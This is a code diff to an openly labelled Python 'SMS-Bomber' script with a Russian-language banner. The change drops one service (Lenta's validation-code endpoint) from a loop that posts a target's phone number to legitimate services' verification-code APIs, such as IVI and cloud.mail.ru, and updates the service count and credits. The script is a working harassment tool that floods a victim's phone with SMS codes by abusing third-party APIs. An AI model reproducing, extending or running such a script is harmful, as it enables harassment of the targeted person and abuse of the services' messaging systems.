@@ -6,11 +6,11 @@ banner = """
 |                                                    |
 | [--] Программа: SMS-Bomber                         |
 |                                                    |
-| [--] Имеющийся Серсвисы: 51                        |
+| [--] Имеющийся Серсвисы: 50                        |
 |                                                    |
 | [--] Сделано: KerryLxrd                            |
 |                                                    |
-| [--] Доработано: ShAApp                            |
+| [--] Доработано и исправлено: IDKMyNickname        |
 |                                                    |
 | [--] Версия: 1.0                                   |
 |____________________________________________________|
@@ -268,14 +268,6 @@ while True:
         print('[+] IVI отправлено!')
     except:
         print('[-] Не отправлено!')
-
-    try:
-        requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
-                      json={'phone': '+' + self.formatted_phone})
-        print('[+] Lenta отправлено!')
-    except:
-        print('[-] Не отправлено!')
-
     try:
         requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                       json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
